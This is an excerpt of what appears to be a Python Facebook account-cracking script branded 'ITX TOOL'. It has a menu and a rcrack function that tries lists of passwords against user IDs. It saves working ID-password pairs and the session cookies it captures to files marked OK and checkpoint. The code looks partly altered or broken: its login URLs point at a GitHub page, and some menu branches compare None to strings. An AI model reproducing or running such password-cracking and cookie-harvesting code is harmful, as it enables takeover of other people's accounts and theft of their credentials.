...
def o():
    ...
    jalan('\x1b[1;32m [1]\x1b[1;33m Followers CRACK ')
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/khairullah.khorasani')
        return None
    if None == '3':
        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
        return None
...
def cek_apk(session,coki):
    w=session.get("https://github.com/mohaghhjj/TRS",cookies={"cookie":coki}).text
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mARMAN\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ITx' ArMan
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-ITX
...
\033[1;37m================= \33[32;45mARYAN\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO ITX TOOL\33[0;m
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            free_fb = session.get('https://github.com/mohaghhjj/TRS').text
            log_data = {
            ...
            "user-agent": pro}
            lo = session.post('https://github.com/mohaghhjj/TRS',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(ARMAN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ARMAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ARMAN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ARMAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ARMAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
